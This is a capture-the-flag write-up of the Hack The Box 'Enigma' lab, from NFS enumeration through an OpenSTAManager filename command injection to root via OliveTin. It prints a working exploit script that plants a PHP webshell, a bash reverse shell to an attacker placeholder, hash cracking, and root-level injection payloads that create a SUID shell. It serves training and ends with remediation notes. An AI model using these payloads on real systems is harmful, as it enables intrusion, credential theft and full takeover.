# HTB Enigma — Writeup

**Target IP:** 10.129.176.143
**Difficulty:** Medium
**OS:** Linux (Ubuntu)

## Summary

Enigma is a Linux box that chains an exposed NFS share, an internal phishing-style document leak, password reuse across a webmail platform, a known CVE in a CRM/ticketing application (OpenSTAManager), database credential harvesting, offline hash cracking, and finally a misconfigured local automation tool (OliveTin) with guest command execution enabled, leading to root.

**Attack chain:**

```
NFS Share Enumeration → Leaked Onboarding PDF → Webmail Credentials (kevin)
→ Password Reuse → Second Mailbox (sarah) → Internal App Credentials (admin)
→ OpenSTAManager CVE-2025-69212 (OS Command Injection) → RCE as www-data
→ Application Config Disclosure → Database Credentials
→ Dump zz_users Table → bcrypt Hash → Offline Crack (haris)
→ Local Login as haris → User Flag
→ OliveTin (root, localhost:1337, guest exec enabled)
→ Command Injection via db_pass template argument → Root Shell → Root Flag
```

---

## 1. Reconnaissance

```bash
nmap -sV -sC --reason --min-rate 5000 10.129.176.143
```

Open ports:

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH (OpenSSH 9.6p1) | password auth disabled, pubkey only |
| 80   | nginx 1.24.0 | redirects to `enigma.htb` |
| 110/995 | POP3 / POP3S | Dovecot |
| 111  | rpcbind | exposes NFS-related RPC services |
| 143/993 | IMAP / IMAPS | Dovecot |
| 2049 | NFS | exported share found |

Added the base domain to `/etc/hosts`:

```bash
echo "10.129.176.143 enigma.htb" | sudo tee -a /etc/hosts
```

---

## 2. NFS Enumeration

```bash
showmount -e 10.129.176.143
```

Result:
```
Export list for 10.129.176.143:
/srv/nfs/onboarding *
```

The `*` indicates the share is exported to any host — no IP restriction.

Mounted the share:

```bash
mkdir -p /tmp/nfs_onboarding
mount -t nfs -o nolock,vers=3 10.129.176.143:/srv/nfs/onboarding /tmp/nfs_onboarding
ls -la /tmp/nfs_onboarding
```

Found a single file: `New_Employee_Access.pdf`.

---

## 3. Extracting Leaked Credentials from the PDF

The PDF used FlateDecode compression so `cat` showed binary garbage. Extracted properly:

```bash
pdftotext New_Employee_Access.pdf -
```

Contents revealed onboarding details for a new employee:

```
Employee:  Kevin Mitchell
Webmail URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

---

## 4. Webmail Access (Roundcube)

Added the new vhost:

```bash
echo "10.129.176.143 mail001.enigma.htb" | sudo tee -a /etc/hosts
```

Confirmed the IMAP credentials worked:

```bash
openssl s_client -connect 10.129.176.143:993 -quiet
a LOGIN kevin Enigma2024!
```

Logged into the Roundcube web interface at `http://mail001.enigma.htb` and read Kevin's inbox. An email from `sarah@enigma.htb` (Accounts department) was a generic onboarding welcome message, but confirmed Sarah as another staff member and mentioned access being delivered via shared resources.

**Roundcube version check** (via page source `rcversion` env variable): `10616` → decodes to **Roundcube 1.6.16** — a patched version, so no Roundcube-specific CVE applied here. This ruled out the webmail platform itself as the entry point and confirmed the intended path was password reuse.

---

## 5. Password Reuse → Second Mailbox

Tried Kevin's password against Sarah's account:

```bash
openssl s_client -connect 10.129.176.143:993 -quiet
a LOGIN sarah Enigma2024!
```

**Success.** Logged into Sarah's Roundcube mailbox and found an email from `it@enigma.htb`:

```
Subject: Re: OpenSTAManager Access Request

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

---

## 6. OpenSTAManager — Identifying the Application

Added the vhost:

```bash
echo "10.129.176.143 support_001.enigma.htb" | sudo tee -a /etc/hosts
```

Logged in with `admin / Ne3s4rtars78s`. Checked the version via the application UI/Wappalyzer:

```
OpenSTAManager Version 2.9.8 (5ff39df9b)
```

Version 2.9.8 is vulnerable to several known CVEs, notably:

- **CVE-2025-69212** — OS Command Injection in P7M file processing (the one exploited here)
- CVE-2026-27012 — Privilege escalation via unauthenticated group modification
- CVE-2025-69213 — SQL Injection in `ajax_complete.php`

---

## 7. Exploiting CVE-2025-69212 (OS Command Injection → RCE)

### Vulnerability

File: `src/Util/XML.php`, function `decodeP7M()`. When a ZIP archive containing a `.p7m` file is imported, the filename from the ZIP is passed unsanitized into a shell `exec()` call (`openssl smime -verify ...`). An attacker can break out of the double-quoted filename argument by embedding shell metacharacters in the filename itself.

### Step 1 — Build the malicious ZIP

```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

> Note: PHP's `ZipArchive::extractTo()` splits filenames on `/`, so the injected command must avoid `/` — use `cd dir && command` instead of absolute paths.

### Step 2 — Upload via the import endpoint

```bash
curl "http://support_001.enigma.htb/actions.php" \
  -H "Cookie: PHPSESSID=<valid_admin_session>" \
  -F "blob1=@exploit.zip;type=application/zip" \
  -F "op=save" \
  -F "id_module=14" \
  -F "id_plugin=48"
```

A `500 Internal Server Error` with an XML parsing error is **expected** — the injected command already executed before the XML parser failed.

### Step 3 — Trigger the webshell

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
```

Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed.

### Step 4 — Get an interactive reverse shell

```bash
nc -lvnp 4444
```

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=$(python3 -c "import urllib.parse; print(urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\"'))")"
```

Stabilized the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 8. Credential Harvesting from Application Configs

Located config files:

```bash
find / -iname "config.inc.php" 2>/dev/null
```

```
/var/www/html/roundcube/config/config.inc.php
/var/www/html/openstamanager/config.inc.php
```

**OpenSTAManager DB credentials:**
```php
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

**Roundcube DB credentials:**
```php
$config['db_dsnw'] = 'mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail';
```

---

## 9. Database Dump and Hash Cracking

Dumped the application's user table:

```bash
mysql -u brollin -p'Fri3nds@9099' -h localhost openstamanager -e "select * from zz_users;"
```

Result:

| id | username | password (bcrypt) | email |
|----|----------|---|---|
| 1 | admin | `$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu` | admin@enigma.htb |
| 2 | haris | `$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC` | haris@enigma.htb |

Note: `kevin` and `sarah` system accounts exist but are set to non-interactive shells (`This account is currently not available.`), ruling them out as direct login targets — `haris` was the real target since a `/home/haris` directory existed.

Cracked the `haris` hash:

```bash
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt haris_hash.txt
john --show haris_hash.txt
```

Cracked password: **`bestfriends`**

---

## 10. Lateral Movement to `haris` — User Flag

```bash
su haris
# Password: bestfriends
```

```bash
cat /home/haris/user.txt
```

```
22b7a54517a1920dda93638331df6a38
```

---

## 11. Privilege Escalation — OliveTin (Root)

### Discovery

`ps -aux` revealed a root-owned process:

```
root  1519  ... /usr/local/bin/OliveTin
```

`netstat -tlnp` showed it listening only on localhost:

```
tcp  0  0  127.0.0.1:1337  0.0.0.0:*  LISTEN
```

OliveTin is a web UI for executing predefined shell commands/scripts — exactly the kind of service worth checking for misconfigurations.

### Config Review

```bash
cat /etc/OliveTin/config.yaml
```

Two critical settings stood out:

```yaml
authRequireGuestsToLogin: false
defaultPermissions:
  exec: true
```

This means **any unauthenticated local request can execute any configured action.**

A vulnerable action was defined:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
```

`db_user` and `db_name` are restricted to alphanumeric characters (`ascii_identifier`), but `db_pass` (`type: password`) has no character restrictions, and its value is interpolated directly inside single quotes in the shell command — making it injectable.

### Finding the API Schema

The REST-style guesses initially failed. Extracted the real API contract from the binary:

```bash
strings /usr/local/bin/OliveTin | grep -A2 -B2 "StartActionRequest"
```

This revealed:
- The service is a **Connect-RPC** API, mounted at `/api/<package>.<Service>/<Method>`
- The correct request field is **`binding_id`** (JSON: `bindingId`) — not `actionId` as initially assumed
- Request body shape: `{"bindingId": "...", "arguments": [{"name": "...", "value": "..."}]}`

### Confirming Injection

Sent a benign proof-of-concept first:

```bash
curl -s -X POST http://127.0.0.1:1337/api/apiv1.OliveTinApiService/StartAction \
  -H "Content-Type: application/json" \
  -H "Connect-Protocol-Version: 1" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"a"},{"name":"db_name","value":"a"},{"name":"db_pass","value":"x'\''; touch /tmp/poc_test; echo '\''"}]}'
```

```bash
ls -la /tmp/poc_test
# -rw-r--r-- 1 root root 0 ... /tmp/poc_test
```

File created and **owned by root** — confirmed command injection executing as root.

### Exploitation — SUID Root Shell

```bash
curl -s -X POST http://127.0.0.1:1337/api/apiv1.OliveTinApiService/StartAction \
  -H "Content-Type: application/json" \
  -H "Connect-Protocol-Version: 1" \
  -d '{"bindingId":"backup_database","arguments":[{"name":"db_user","value":"a"},{"name":"db_name","value":"a"},{"name":"db_pass","value":"x'\''; cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash; echo '\''"}]}'
```

```bash
ls -la /tmp/rootbash
# -rwsrwxrwx 1 root root 1446024 ... /tmp/rootbash

/tmp/rootbash -p
id
# uid=0(root) ...
```

### Root Flag

```bash
cat /root/root.txt
```

```
a83f4651081233e86497f7b27c984035
```

---

## Vulnerability Summary

| # | Vulnerability | Component | Impact |
|---|---|---|---|
| 1 | NFS export with no host restriction (`*`) | NFS share `/srv/nfs/onboarding` | Information disclosure (onboarding PDF with credentials) |
| 2 | Plaintext credentials in distributed document | Onboarding PDF | Initial webmail access |
| 3 | Password reuse across accounts | Roundcube | Access to second mailbox, exposed admin credentials |
| 4 | CVE-2025-69212 — OS Command Injection (P7M filename) | OpenSTAManager 2.9.8 | RCE as `www-data` |
| 5 | Plaintext DB credentials in application config | OpenSTAManager / Roundcube config files | Database access |
| 6 | Weak password / crackable bcrypt hash | `zz_users` table (`haris`) | Local user shell |
| 7 | Guest command execution enabled + unsanitized shell template argument | OliveTin (running as root, localhost:1337) | Full root compromise |

## Key Lessons / Remediation Notes

- NFS exports should always be restricted to specific trusted hosts, never `*`.
- Sensitive credentials should never be distributed via plaintext documents (PDF, email).
- Password reuse across services is a major lateral movement risk — enforce unique credentials per system.
- Keep third-party applications (OpenSTAManager, Roundcube, etc.) patched; CVE-2025-69212 was fixed in later releases via `escapeshellarg()` and filename validation.
- Application config files containing database credentials should have restrictive file permissions and ideally use environment-based secrets instead of plaintext `config.inc.php`.
- Enforce strong, unique passwords system-wide; weak passwords remain crackable via `rockyou.txt` even with bcrypt.
- **OliveTin** (or any local automation/admin tool) should never run with `authRequireGuestsToLogin: false` in combination with `exec: true` permissions — this effectively grants anyone on localhost (or anyone able to reach the port) root-equivalent code execution. Additionally, shell templates that interpolate user-supplied arguments must sanitize/escape input rather than directly embedding it in `shell:` command strings.
